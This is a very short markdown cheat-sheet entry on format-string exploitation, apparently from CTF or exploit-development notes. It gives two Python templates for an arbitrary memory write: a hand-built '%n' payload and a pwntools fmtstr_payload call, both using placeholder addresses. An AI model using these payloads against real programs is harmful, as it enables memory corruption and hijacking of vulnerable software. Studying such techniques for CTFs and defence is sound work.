# Format String

## Arbitrary write

```python

# Manually
# NB. '|' string is often too long, so there is an additional trick which I'm not mentioning
payload = f"{w_dest_addr}{'|'*(str2w-addr_size)}%{buf_start_arg}$n"

# With pwntools
payload = fmtstr_payload(BUG_START_ARG, {W_DEST_ADDR : HEX2W})

```
